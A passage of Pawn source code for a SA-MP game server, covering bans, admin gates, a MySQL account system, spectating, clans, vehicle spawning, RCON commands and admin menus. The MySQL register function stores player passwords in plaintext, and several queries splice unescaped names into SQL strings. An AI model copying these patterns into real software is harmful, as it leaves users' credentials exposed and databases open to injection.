     }
     new string[128];
     new str[50], str1[100];
     format(string, sizeof(string),"Admin: %s", admin);
     format(str, sizeof(str),"Player: %s", pname);
     format(str1, sizeof(str1),"Reason: %s", string1);
     SendClientMessage(playerid, red,"Your IP are banned from this server!");
     SendClientMessage(playerid, red,"___________________");
     SendClientMessage(playerid, red, str);
     SendClientMessage(playerid, red, string);
     SendClientMessage(playerid, red, str1);
     SendClientMessage(playerid, red,"___________________");
     SendClientMessage(playerid, red, "If you think that this BAN was a mistake, then post a screenshot(using F8) on our website");
     SendClientMessage(playerid, red, "The IP has Been Banned you wont be able to join unless u make an appeal");
	 SendClientMessage(playerid, red, "Please make a unban application at our forum");
	 SendClientMessage(playerid, red, "Forum  xenon-extreme.com");
     SetTimerEx("DelayedKick", 400, false, "i", playerid);
  }
  mysql_free_result();
  return 1;
}
//=======================================Admin Area gates=======================================
public MeetingGateClose(playerid)
{
		MoveObject(meetinggate,2498.57983,-1612.65076,1011.24847,2.0,0.00000,0.00000,-90.00000);
		SendClientMessage(playerid,0xFF8000FF,"Meeting Room Gate is now closing");
		return 1;
}

public CabinGateClose(playerid)
{
		MoveObject(cabingate,2521.80981,-1603.09180,1011.24847,2.0,0.00000,0.00000,0.00000);
		SendClientMessage(playerid,0xFF8000FF,"Cabin Gate is now closing");
		return 1;
}

public MainGateClose(playerid)
{
		MoveObject(maingate,2501.95386,-1603.09180,1011.24847,2.0,0.00000,0.00000,0.00000);
		SendClientMessage(playerid,0xFF8000FF,"Main Gate is now closing");
		return 1;
}
//++++++++++++++++++++++++++++++++++DombleDore+=++++++++++++++++++++++++++++++++
public uselessnrg()
{
//	for(new i=314;i<MAX_VEHICLES;i++)
	forveh(i) //trying to test foreach class for vehicles added include in vehicles and in vehicles >> main
	{
	   	if(IsVehicleOccupied(i) == 0 && GetVehicleModel(i) == 522)
	  	{
	       	DestroyVehicle(i);
	   	}
	}
	SendClientMessageToAll(0xFFFF00FF,"Wizard Dumbledore Has Respawned All Unused Useless NRGs");
	return 1;
}
//==============================Prototype=============================
/*public OnPlayerEnterCheckpoint(playerid)
{
    if(StealingA69Prot[playerid] == 1)
        {
            new playervehicleid = GetPlayerVehicleID(playerid);
            if(playervehicleid == A69Prot)
            {
                SetPlayerScore(playerid, GetPlayerScore(playerid) + 5);
                SetVehicleToRespawn(A69Prot);
                GivePlayerMoney(playerid, 15000);
                StealingA69Prot[playerid] = 0;
                GameTextForPlayer(playerid, "You ~r~stole ~w~the ~g~Area69 Prototype ~w~!", 5000, 3);
                new pname[24];
                GetPlayerName(playerid, pname, 24);
                new kk[128];
                format(kk, sizeof(kk), "** %s (%d) successfully stole the Area69 Prototype!",pname,playerid);
                SendClientMessageToAll(0xC93CCE00,kk);
                SetPVarInt(playerid,"StealingTime",GetTickCount()+600000);
                DisablePlayerCheckpoint(playerid);
                RemovePlayerMapIcon(playerid,1);
            }
    }
	return 1;
}
*/
//===============================Respawn u cars=================================
stock IsVehicleOccupied(vid)
{
    new flag = 0;
     for(new i; i < GetMaxPlayers(); i++)
     {
          if(!IsPlayerConnected(i)) continue;
          if(GetPlayerVehicleID(i) == vid){
		  flag = 1;
		  break;
		  }
     }
     
     return flag;
}
//++++++++++++++++++++++SQL SYS++++++++++++++++++++++++++++++++++++++++
//NOTE:Passwordstring has already been escaped. If you want to use
//this in another script, make sure that you escape the passwordstring
//before you
stock MySQL_Register(playerid, passwordstring[])
{
    new query[200], pname[24], IP[16];
    GetPlayerName(playerid, pname, 24);
    GetPlayerIp(playerid, IP, 16);
    format(query, sizeof(query), "INSERT INTO Accounts (Name, password, Score, Cash, IP) VALUES('%s', '%s', 0, 0, '%s')", pname, passwordstring, IP);
//    format(query, sizeof(query), "INSERT INTO playerdata (user, password, score, money, IP, adminlevel, oplevel, pkills, pdeaths, dlevel, phours, pminutes, pseconds) VALUES('%s', SHA1('%s'), 0, 0, '%s', 0, 0, 0, 0, 0, 0, 0, 0)", pname, passwordstring, IP);
    mysql_query(query);
    //We do not need to store or free a result as it
    //is not a select statement. We can now send the
    //client a registration success message and set the
    //Login variable to 1.
    SendClientMessage(playerid, -1, "You have been registered on this server!");
    if(recovery == 1)
    MySQL_Login_Old(playerid);
    Logged[playerid] = 1;
	PlayerInfo[playerid][LoggedIn] = 1; //Sets the login variable
    return 1;
}

stock MySQL_Login(playerid)
{
    new query[300], pname[24], savingstring[20];
    GetPlayerName(playerid, pname, 24);
    format(query, sizeof(query), "SELECT Score,Cash,Level,Coins,Kills,Deaths,Vip,Kicks,Bans,Jails,license FROM Accounts WHERE Name = '%s'", pname);
    //We only select the variables that we want to use.
    //We don't need things like the password string or the user string.
    mysql_query(query); //Queries the result
    mysql_store_result(); //Store a result because it's a SELECT statement.
    while(mysql_fetch_row_format(query,"|"))
    {
        //We use while so that it does a single query, not multiple
        //Especially when we have more variables. If there is more
        //Variables, you should just split the line with sscanf. To
        //Make it easier.
        mysql_fetch_field_row(savingstring, "Score"); SetPlayerScore(playerid, strval(savingstring));
        mysql_fetch_field_row(savingstring, "Cash"); MoneyGiven[playerid] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "Level");PlayerInfo[playerid][Level] = strval(savingstring);
       	mysql_fetch_field_row(savingstring, "Coins");PlayerInfo[playerid][Helper] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "Kills");PlayerInfo[playerid][Kills] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "Deaths");PlayerInfo[playerid][Deaths] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "Vip");PlayerInfo[playerid][dRank] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "Kicks");PlayerInfo[playerid][hours] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "Bans");PlayerInfo[playerid][mins] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "Jails");PlayerInfo[playerid][secs] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "license");License[playerid] = strval(savingstring);
        
        TempAdmin[playerid] = PlayerInfo[playerid][Level];
        //If you are wondering why I'm using savingstring instead
        //Of a variable like using MoneyGiven right away, it's because
        //mysql_fetch_field_row requires a string.
    }
    mysql_free_result(); //We must always free a stored result
    SendClientMessage(playerid, -1, "You have been logged in!"); //Sends the client a message.
    Logged[playerid] = 1;
	PlayerInfo[playerid][LoggedIn] = 1; //Sets our logged in variable to one
    return 1;
}
stock MySQL_Login_Old(playerid)
{
    new query[300], pname[24], savingstring[20];
    GetPlayerName(playerid, pname, 24);
    format(query, sizeof(query), "SELECT * FROM playerdata WHERE user = '%s'", pname);
    //We only select the variables that we want to use.
    //We don't need things like the password string or the user string.
    mysql_query(query); //Queries the result
    mysql_store_result(); //Store a result because it's a SELECT statement.
    while(mysql_fetch_row_format(query,"|"))
    {
        //We use while so that it does a single query, not multiple
        //Especially when we have more variables. If there is more
        //Variables, you should just split the line with sscanf. To
        //Make it easier.
        mysql_fetch_field_row(savingstring, "score"); SetPlayerScore(playerid, strval(savingstring));
        mysql_fetch_field_row(savingstring, "money"); MoneyGiven[playerid] = strval(savingstring);
//        mysql_fetch_field_row(savingstring, "adminlevel");PlayerInfo[playerid][Level] = strval(savingstring);
       	mysql_fetch_field_row(savingstring, "oplevel");PlayerInfo[playerid][Helper] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "pkills");PlayerInfo[playerid][Kills] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "pdeaths");PlayerInfo[playerid][Deaths] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "dlevel");PlayerInfo[playerid][dRank] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "phours");PlayerInfo[playerid][hours] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "pminutes");PlayerInfo[playerid][mins] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "pseconds");PlayerInfo[playerid][secs] = strval(savingstring);
        mysql_fetch_field_row(savingstring, "license");License[playerid] = strval(savingstring);

        TempAdmin[playerid] = PlayerInfo[playerid][Level];
        //If you are wondering why I'm using savingstring instead
        //Of a variable like using MoneyGiven right away, it's because
        //mysql_fetch_field_row requires a string.
    }
    mysql_free_result(); //We must always free a stored result
//    GameTextForAll("Use /recoverscore to recover old stats",4000,3);
    SendClientMessage(playerid, -1, "Sucessfully Loaded Old Database!"); //Sends the client a message.
    Logged[playerid] = 1;
	PlayerInfo[playerid][LoggedIn] = 1; //Sets our logged in variable to one
    return 1;
}
//==============================================================================
#if defined ENABLE_SPEC

stock StartSpectate(playerid, specplayerid)
{
	for(new x=0; x<MAX_PLAYERS; x++) {
	    if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid) {
	       AdvanceSpectate(x);
		}
	}
	SetPlayerInterior(playerid,GetPlayerInterior(specplayerid));
	TogglePlayerSpectating(playerid, 1);

	if(IsPlayerInAnyVehicle(specplayerid)) {
		PlayerSpectateVehicle(playerid, GetPlayerVehicleID(specplayerid));
		PlayerInfo[playerid][SpecID] = specplayerid;
		PlayerInfo[playerid][SpecType] = ADMIN_SPEC_TYPE_VEHICLE;
	}
	else {
		PlayerSpectatePlayer(playerid, specplayerid);
		PlayerInfo[playerid][SpecID] = specplayerid;
		PlayerInfo[playerid][SpecType] = ADMIN_SPEC_TYPE_PLAYER;
	}
	new string[100], Float:hp, Float:ar;
	GetPlayerName(specplayerid,string,sizeof(string));
	GetPlayerHealth(specplayerid, hp);	GetPlayerArmour(specplayerid, ar);
	format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~n~~w~%s - id:%d~n~< sprint - jump >~n~hp:%0.1f ar:%0.1f $%d", string,specplayerid,hp,ar,GetPlayerMoney(specplayerid) );
	GameTextForPlayer(playerid,string,25000,3);
	return 1;
}

stock StopSpectate(playerid)
{
	TogglePlayerSpectating(playerid, 0);
	PlayerInfo[playerid][SpecID] = INVALID_PLAYER_ID;
	PlayerInfo[playerid][SpecType] = ADMIN_SPEC_TYPE_NONE;
	Spectating[playerid] = 0;
	GameTextForPlayer(playerid,"~n~~n~~n~~w~Spectate mode ended",1000,3);
	return 1;
}

stock AdvanceSpectate(playerid)
{
    if(ConnectedPlayers() == 2) { StopSpectate(playerid); return 1; }
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][SpecID] != INVALID_PLAYER_ID)
	{
	    for(new x=PlayerInfo[playerid][SpecID]+1; x<=MAX_PLAYERS; x++)
		{
	    	if(x == MAX_PLAYERS) x = 0;
	        if(IsPlayerConnected(x) && x != playerid)
			{
				if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] != INVALID_PLAYER_ID || (GetPlayerState(x) != 1 && GetPlayerState(x) != 2 && GetPlayerState(x) != 3))
				{
					continue;
				}
				else
				{
					StartSpectate(playerid, x);
					break;
				}
			}
		}
	}
	return 1;
}

stock ReverseSpectate(playerid)
{
    if(ConnectedPlayers() == 2) { StopSpectate(playerid); return 1; }
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][SpecID] != INVALID_PLAYER_ID)
	{
	    for(new x=PlayerInfo[playerid][SpecID]-1; x>=0; x--)
		{
	    	if(x == 0) x = MAX_PLAYERS;
	        if(IsPlayerConnected(x) && x != playerid)
			{
				if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] != INVALID_PLAYER_ID || (GetPlayerState(x) != 1 && GetPlayerState(x) != 2 && GetPlayerState(x) != 3))
				{
					continue;
				}
				else
				{
					StartSpectate(playerid, x);
					break;
				}
			}
		}
	}
	return 1;
}

//-------------------------------------------
#endif
//========================================Clan sys stock========================
    stock DisplayGroupMembers(groupid, playerid)
    {
        new amount[2], string[200], shortstr[55], pname[24];
        format(string, sizeof(string), "Clan Members for %s(ID:%d)", groupinfo[groupid][grname], groupid);
        SendClientMessage(playerid, 0xFFFFFF, string);
        string = "";
        for(new x; x<MAX_PLAYERS; x++)
            {
                if(group[x][gid] == groupid)
                {
                    amount[0] ++;
                    amount[1] ++;
                    GetPlayerName(x, pname, 24);
                    if(groupinfo[groupid][leader] != x) format(shortstr, sizeof(shortstr), "%s(%d),", pname, x);
                    if(groupinfo[groupid][leader] == x) format(shortstr, sizeof(shortstr), "[CLAN LEADER]%s(%d),", pname, x);
                    if(amount[1] == 1) format(string, sizeof(string), "%s", shortstr);
                    if(amount[1] != 1) format(string, sizeof(string), "%s %s", string, shortstr);
                    if(amount[0] == 6)
                    {
                        strdel(string, strlen(string)-1, strlen(string));
                        SendClientMessage(playerid, 0xFFCC66, string);
                        string = "";
                        amount[0] = 0;
                    }
                }
            }
        strdel(string, strlen(string)-1, strlen(string));
        if(amount[0] != 0) SendClientMessage(playerid, 0xFFCC66, string);
        return 1;
    }
    

	stock ListGroups(playerid)
    {
    new amount[2], string[200], shortstr[55];
    SendClientMessage(playerid, 0xFFFFFF, "Current clan:");
    for(new x=0; x<MAX_GROUPS; x++)
    {
    if(groupinfo[x][active])
    {
    amount[0] ++;
    amount[1] ++;
    format(shortstr, sizeof(shortstr), "%s(ID:%d)", groupinfo[x][grname], x);
	if(amount[1] == 1) format(string, sizeof(string), "%s", shortstr);
	if(amount[1] != 1) format(string, sizeof(string), "%s %s", string, shortstr);
 	if(amount[0] == 4)
                            {
                                SendClientMessage(playerid, 0xFFCC66, string);
                                string = "";
                                amount[0] = 0;
                            }
                    }
            }
  	if(amount[1] == 0) SendClientMessage(playerid, 0xFFFF00, "There are currently no active clan!");
  	if(amount[1] != 0) SendClientMessage(playerid, 0xFFCC66, string);
  	return 1;
    }



    stock SendMessageToLeader(groupi, message[])
        return SendClientMessage(groupinfo[groupi][leader], 0xFFCC66, message);

    stock GroupJoin(playerid, groupi)
    {
            group[playerid][gid] = groupi;
            group[playerid][order] = GroupMembers(groupi);
        	group[playerid][attemptjoin] = -1;
        	group[playerid][invited] = -1;
        	new pname[24], string[130];
            GetPlayerName(playerid, pname, 24);
        	format(string, sizeof(string), "%s has joined your clan!", pname);
        	SendMessageToAllGroupMembers(groupi, string);
            format(string, sizeof(string), "You have joined clan %s(ID:%d)", groupinfo[groupi][grname] ,groupi);
            SendClientMessage(playerid, 0xFFCC66, string);
            return 1;
    }

    stock FindNextSlot()
    {
            new id;
            while(groupinfo[id][active]) id ++;
            return id;
    }

    stock IsGroupTaken(grpname[])
    {
            for(new x; x<MAX_GROUPS; x++)
            {
                if(groupinfo[x][active] == 1)
                {
                            if(!strcmp(grpname, groupinfo[x][grname], true) && strlen(groupinfo[x][grname]) != 0) return 1;
                    }
            }
            return 0;
    }

    stock GroupInvite(playerid, groupid)
        return group[playerid][invited] = groupid;

    stock CreateGroup(grpname[], owner)
    {
            new slotid = FindNextSlot();
            groupinfo[slotid][leader] = owner;
            format(groupinfo[slotid][grname], 75, "%s", grpname);
            groupinfo[slotid][active] = 1;
            group[owner][gid] = slotid;
            group[owner][order] = 1;
            new string[120];
			new cfile[128];
    		format(cfile, sizeof(cfile), savefolderclanname,grpname);
    		if(!dini_Exists(cfile)) {
        		dini_Create(cfile);
        		dini_IntSet(cfile, "slotid", slotid);
        		}
            format(string, sizeof(string), "You have created the clan %s(ID:%d)", grpname, slotid);
            SendClientMessage(owner, 0xFFCC66, string);
            return slotid;
    }

    stock LeaveGroup(playerid, reason)
    {
            new groupid = group[playerid][gid], orderid = group[playerid][order], string[100], pname[24];
            group[playerid][gid] = -1;
            group[playerid][order] = -1;
            GroupCheck(groupid, orderid);
            GetPlayerName(playerid, pname, 24);
            if(reason == 0)
            {
                    format(string, sizeof(string), "{FFFFFF}%s(%d){FFCC66} has left your clan!", pname, playerid);
                    SendClientMessage(playerid, 0xFFCC66, "You have left your clan");
            }
            if(reason == 1)
            {
                    format(string, sizeof(string), "{FFFFFF}%s(%d){FFCC66} has left your clan (Kicked by the leader)!", pname, playerid);
            		SendClientMessage(playerid, 0xFFCC66, "You have been kicked from your group!");
            }
        	if(reason == 2) format(string, sizeof(string), "{FFFFFF}%s(%d){FFCC66} has left the server (Disconnected)!", pname, playerid);
            SendMessageToAllGroupMembers(groupid, string);
            return 1;
    }

    stock GroupCheck(groupid, orderid)
    {
            new gmems = GroupMembers(groupid);
            if(!gmems) groupinfo[groupid][active] = 0;
            if(gmems != 0) ChangeMemberOrder(groupid, orderid);
            return 1;
    }

    stock GroupMembers(groupid)
    {
        	if(!groupinfo[groupid][active]) return 0;
            new groupmembers;
            for(new i; i<MAX_PLAYERS; i++) if(group[i][gid] == groupid) groupmembers++;
            return groupmembers;
    }

    stock ChangeMemberOrder(groupid, orderid)
    {
            for(new x; x<MAX_PLAYERS; x++)
            {
                    if(group[x][gid] != groupid || group[x][order] < orderid) continue;
                    group[x][order] --;
                    if(group[x][order] == 1)
                    {
                            groupinfo[groupid][leader] = x;
                            new string[128], pname[24];
                            GetPlayerName(x, pname, 24);
                            format(string, sizeof(string), "{FFFFFF}%s(%d){FFCC66} has been promoted to the new group clan!", pname, x);
                            SendMessageToAllGroupMembers(groupid, string);
                    }
            }
            return 1;
    }

    stock SendMessageToAllGroupMembers(groupid, message[])
    {
    		for(new x; x<MAX_PLAYERS; x++) if(group[x][gid] == groupid) SendClientMessage(x, 0xFFCC66, message);
            return 1;
    }




//==============================================================================
EraseVehicle(vehicleid)
{
    for(new players=0;players<=MAX_PLAYERS;players++)
    {
        new Float:X,Float:Y,Float:Z;
        if (IsPlayerInVehicle(players,vehicleid))
        {
            GetPlayerPos(players,X,Y,Z);
            SetPlayerPos(players,X,Y,Z+2);
            SetVehicleToRespawn(vehicleid);
        }
        SetVehicleParamsForPlayer(vehicleid,players,0,1);
    }
    SetTimerEx("VehRes",3000,0,"d",vehicleid);
    return 1;
}

forward CarSpawner(playerid,model);
public CarSpawner(playerid,model)
{
	if(IsPlayerInAnyVehicle(playerid)) SendClientMessage(playerid, red, "You already have a car!");
 	else
	{
    	new Float:x, Float:y, Float:z, Float:angle;
	 	GetPlayerPos(playerid, x, y, z);
	 	GetPlayerFacingAngle(playerid, angle);
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
	    new vehicleid=CreateVehicle(model, x, y, z, angle, -1, -1, -1);
		PutPlayerInVehicle(playerid, vehicleid, 0);
		SetVehicleVirtualWorld(vehicleid, GetPlayerVirtualWorld(playerid));
		LinkVehicleToInterior(vehicleid, GetPlayerInterior(playerid));
		ChangeVehicleColor(vehicleid,0,7);
        PlayerInfo[playerid][pCar] = vehicleid;
	}
	return 1;
}

forward CarDeleter(vehicleid);
public CarDeleter(vehicleid)
{
    for(new i=0;i<MAX_PLAYERS;i++) {
        new Float:X,Float:Y,Float:Z;
    	if(IsPlayerInVehicle(i, vehicleid)) {
    	    RemovePlayerFromVehicle(i);
    	    GetPlayerPos(i,X,Y,Z);
        	SetPlayerPos(i,X,Y+3,Z);
	    }
	    SetVehicleParamsForPlayer(vehicleid,i,0,1);
	}
    SetTimerEx("VehRes",1500,0,"i",vehicleid);
}

forward VehRes(vehicleid);
public VehRes(vehicleid)
{
    DestroyVehicle(vehicleid);
}

public OnVehicleSpawn(vehicleid)
{
	for(new i=0;i<MAX_PLAYERS;i++)
	{
        if(vehicleid==PlayerInfo[i][pCar])
		{
		    CarDeleter(vehicleid);
	        PlayerInfo[i][pCar]=-1;
        }
	}
//       Bomber Pat
 	AttachObjectToVehicle(PatriotObject[0], BomberPatriot[0], 0.0, 0.0, 0.5, 0.0, 0.0, 0.0);
    LinkVehicleToInterior(vehicleid, 0);
    AttachObjectToVehicle(PatriotObject[1], BomberPatriot[1], 0.0, 0.0, 0.5, 0.0, 0.0, 0.0);
    LinkVehicleToInterior(vehicleid, 0);
    AttachObjectToVehicle(PatriotObject[2], BomberPatriot[2], 0.0, 0.0, 0.5, 0.0, 0.0, 0.0);
    LinkVehicleToInterior(vehicleid, 0);
    AttachObjectToVehicle(PatriotObject[3], BomberPatriot[3], 0.0, 0.0, 0.5, 0.0, 0.0, 0.0);
    LinkVehicleToInterior(vehicleid, 0);
    AttachObjectToVehicle(PatriotObject[4], BomberPatriot[4], 0.0, 0.0, 0.5, 0.0, 0.0, 0.0);
    LinkVehicleToInterior(vehicleid, 0);
    
    
	return 1;
}
//==============================================================================
forward TuneLCar(VehicleID);
public TuneLCar(VehicleID)
{
	ChangeVehicleColor(VehicleID,0,7);
	AddVehicleComponent(VehicleID, 1010);  AddVehicleComponent(VehicleID, 1087);
}

//==============================================================================

public OnRconCommand(cmd[])
{
	if( strlen(cmd) > 50 || strlen(cmd) == 1 ) return print("Invalid command length (exceeding 50 characters)");

	if(strcmp(cmd, "ladmin", true)==0) {
		print("Rcon Commands");
		print("info, aka, pm, asay, ann, uconfig, chat");
		return true;
	}

	if(strcmp(cmd, "info", true)==0)
	{
	    new TotalVehicles = CreateVehicle(411, 0, 0, 0, 0, 0, 0, 1000);    DestroyVehicle(TotalVehicles);
		new numo = CreateObject(1245,0,0,1000,0,0,0);	DestroyObject(numo);
		new nump = CreatePickup(371,2,0,0,1000);	DestroyPickup(nump);
		new gz = GangZoneCreate(3,3,5,5);	GangZoneDestroy(gz);

		new model[250], nummodel;
		for(new i=1;i<TotalVehicles;i++) model[GetVehicleModel(i)-400]++;
		for(new i=0;i<250;i++) { if(model[i]!=0) {	nummodel++;	}	}

		new string[256];
		print(" ===========================================================================");
		printf("                           Server Info:");
		format(string,sizeof(string),"[ Players Connected: %d || Maximum Players: %d ] [Ratio %0.2f ]",ConnectedPlayers(),GetMaxPlayers(),Float:ConnectedPlayers() / Float:GetMaxPlayers() );
		printf(string);
		format(string,sizeof(string),"[ Vehicles: %d || Models %d || Players In Vehicle: %d ]",TotalVehicles-1,nummodel, InVehCount() );
		printf(string);
		format(string,sizeof(string),"[ InCar %d  ||  OnBike %d ]",InCarCount(),OnBikeCount() );
		printf(string);
		format(string,sizeof(string),"[ Objects: %d || Pickups %d  || Gangzones %d]",numo-1, nump, gz);
		printf(string);
		format(string,sizeof(string),"[ Players In Jail %d || Players Frozen %d || Muted %d ]",JailedPlayers(),FrozenPlayers(), MutedPlayers() );
	    printf(string);
	    format(string,sizeof(string),"[ Admins online %d  RCON admins online %d ]",AdminCount(), RconAdminCount() );
	    printf(string);
		print(" ===========================================================================");
		return true;
	}

	if(!strcmp(cmd, "pm", .length = 2))
	{
	    new arg_1 = argpos(cmd), arg_2 = argpos(cmd, arg_1),targetid = strval(cmd[arg_1]), message[128];

    	if ( !cmd[arg_1] || cmd[arg_1] < '0' || cmd[arg_1] > '9' || targetid > MAX_PLAYERS || targetid < 0 || !cmd[arg_2])
	        print("JikyBot: Usage:\"pm <playerid> <message>\"");

	    else if ( !IsPlayerConnected(targetid) ) print("This player is not connected!");
    	else
	    {
	        format(message, sizeof(message), "[RCON] PM: %s", cmd[arg_2]);
	        SendClientMessage(targetid, COLOR_WHITE, message);
   	        printf("Rcon PM '%s' sent", cmd[arg_1] );
    	}
	    return true;
	}

	if(!strcmp(cmd, "asay", .length = 4))
	{
	    new arg_1 = argpos(cmd), message[128];

    	if ( !cmd[arg_1] || cmd[arg_1] < '0') print("JikyBot: Usage:\"asay  <message>\" (MessageToAdmins)");
	    else
	    {
	        format(message, sizeof(message), "[RCON] MessageToAdmins: %s", cmd[arg_1]);
	        MessageToAdmins(COLOR_WHITE, message);
	        printf("Admin Message '%s' sent", cmd[arg_1] );
    	}
	    return true;
	}

	if(!strcmp(cmd, "ann", .length = 3))
	{
	    new arg_1 = argpos(cmd), message[128];
    	if ( !cmd[arg_1] || cmd[arg_1] < '0') print("JikyBot: Usage:\"ann  <message>\" (GameTextForAll)");
	    else
	    {
	        format(message, sizeof(message), "[RCON]: %s", cmd[arg_1]);
	        GameTextForAll(message,3000,3);
	        printf("GameText Message '%s' sent", cmd[arg_1] );
    	}
	    return true;
	}

	if(!strcmp(cmd, "msg", .length = 3))
	{
	    new arg_1 = argpos(cmd), message[128];
    	if ( !cmd[arg_1] || cmd[arg_1] < '0') print("JikyBot: Usage:\"msg  <message>\" (SendClientMessageToAll)");
	    else
	    {
	        format(message, sizeof(message), "[RCON]: %s", cmd[arg_1]);
	        SendClientMessageToAll(COLOR_WHITE, message);
	        printf("MessageToAll '%s' sent", cmd[arg_1] );
    	}
	    return true;
	}

	if(strcmp(cmd, "uconfig", true)==0)
	{
		UpdateConfig();
		print("Configuration Successfully Updated");
		return true;
	}

	if(!strcmp(cmd, "aka", .length = 3))
	{
	    new arg_1 = argpos(cmd), targetid = strval(cmd[arg_1]);

    	if ( !cmd[arg_1] || cmd[arg_1] < '0' || cmd[arg_1] > '9' || targetid > MAX_PLAYERS || targetid < 0)
	        print("JikyBot: Usage:aka <playerid>");
	    else if ( !IsPlayerConnected(targetid) ) print("This player is not connected!");
    	else
	    {
			new tmp3[50], playername[MAX_PLAYER_NAME];
	  		GetPlayerIp(targetid,tmp3,50);
			GetPlayerName(targetid, playername, sizeof(playername));
			printf("AKA: [%s id:%d] [%s] %s", playername, targetid, tmp3, dini_Get("ladmin/config/aka.txt",tmp3) );
    	}
	    return true;
	}

	if(!strcmp(cmd, "chat", .length = 4)) {
	for(new i = 1; i < MAX_CHAT_LINES; i++) print(Chat[i]);
    return true;
	}

	return 0;
}


//==============================================================================
//							Menus
//==============================================================================

#if defined USE_MENUS
public OnPlayerSelectedMenuRow(playerid, row) {
  	new Menu:Current = GetPlayerMenu(playerid);
  	new string[128];

    if(Current == LMainMenu) {
        switch(row)
		{
 			case 0:
			{
				if(PlayerInfo[playerid][Level] >= 4) ShowMenuForPlayer(AdminEnable,playerid);
   				else {
   					SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	   				TogglePlayerControllable(playerid,true);
   				}
			}
			case 1:
			{
				if(PlayerInfo[playerid][Level] >= 4) ShowMenuForPlayer(AdminDisable,playerid);
   				else {
   					SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	   				TogglePlayerControllable(playerid,true);
   				}
			}
 			case 2: ShowMenuForPlayer(LWeather,playerid);
 			case 3: ShowMenuForPlayer(LTime,playerid);
   			case 4:	ShowMenuForPlayer(LVehicles,playerid);
			case 5:	ShowMenuForPlayer(LCars,playerid);
 			case 6:
            {
				if(PlayerInfo[playerid][Level] >= 2)
				{
        			if(IsPlayerInAnyVehicle(playerid))
					{
						new LVehicleID = GetPlayerVehicleID(playerid), LModel = GetVehicleModel(LVehicleID);
					    switch(LModel)
						{
							case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
							{
								SendClientMessage(playerid,red,"JikyBot: You can not tune this vehicle");  TogglePlayerControllable(playerid,true);
								return 1;
							}
						}
					    TogglePlayerControllable(playerid,false);	ShowMenuForPlayer(LTuneMenu,playerid);
			        }
					else { SendClientMessage(playerid,red,"JikyBot: You do not have a vehicle to tune"); TogglePlayerControllable(playerid,true); }
		    	} else { SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list."); TogglePlayerControllable(playerid,true);	}
			}
  			case 7:
	  		{
	  			if(PlayerInfo[playerid][Level] >= 3) ShowMenuForPlayer(XWeapons,playerid);
			  	else SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list."); TogglePlayerControllable(playerid,true);
			}
			case 8:	 ShowMenuForPlayer(LTele,playerid);
			case 9:
			{
				new Menu:Currentxmenu = GetPlayerMenu(playerid);
	    		HideMenuForPlayer(Currentxmenu,playerid);   TogglePlayerControllable(playerid,true);
		    }
		}
		return 1;
	}//-------------------------------------------------------------------------
	if(Current == AdminEnable) {
		new adminname[MAX_PLAYER_NAME], file[256]; GetPlayerName(playerid, adminname, sizeof(adminname));
		format(file,sizeof(file),"ladmin/config/Config.sav");
		switch(row){
			case 0: { ServerInfo[AntiSwear] = 1; dini_IntSet(file,"AntiSwear",1); format(string,sizeof(string),"Administrator %s has enabled antiswear",adminname); SendClientMessageToAll(blue,string);	}
			case 1: { ServerInfo[NameKick] = 1; dini_IntSet(file,"NameKick",1); format(string,sizeof(string),"Administrator %s has enabled namekick",adminname); SendClientMessageToAll(blue,string);	}
			case 2:	{ ServerInfo[AntiSpam] = 1; dini_IntSet(file,"AntiSpam",1); format(string,sizeof(string),"Administrator %s has enabled antispam",adminname); SendClientMessageToAll(blue,string);	}
			case 3:	{ ServerInfo[MaxPing] = 1000; dini_IntSet(file,"MaxPing",1000); format(string,sizeof(string),"Administrator %s has enabled ping kick",adminname); SendClientMessageToAll(blue,string);	}
			case 4:	{ ServerInfo[ReadCmds] = 1; dini_IntSet(file,"ReadCmds",1); format(string,sizeof(string),"Administrator %s has enabled reading commands",adminname); MessageToAdmins(green,string);	}
			case 5:	{ ServerInfo[ReadPMs] = 1; dini_IntSet(file,"ReadPMs",1); format(string,sizeof(string),"Administrator %s has enabled reading pms",adminname); MessageToAdmins(green,string); }
			case 6:	{ ServerInfo[NoCaps] = 0; dini_IntSet(file,"NoCaps",0); format(string,sizeof(string),"Administrator %s has allowed captial letters in chat",adminname); SendClientMessageToAll(blue,string); }
			case 7:	{ ServerInfo[ConnectMessages] = 1; dini_IntSet(file,"ConnectMessages",1); format(string,sizeof(string),"Administrator %s has enabled connect messages",adminname); SendClientMessageToAll(blue,string); }
			case 8:	{ ServerInfo[AdminCmdMsg] = 1; dini_IntSet(file,"AdminCmdMessages",1); format(string,sizeof(string),"Administrator %s has enabled admin command messages",adminname); MessageToAdmins(green,string); }
			case 9:	{ ServerInfo[AutoLogin] = 1; dini_IntSet(file,"AutoLogin",1); format(string,sizeof(string),"Administrator %s has enabled auto login",adminname); SendClientMessageToAll(blue,string); }
            case 10: return ChangeMenu(playerid,Current,LMainMenu);
		 }
		return TogglePlayerControllable(playerid,true);
	}
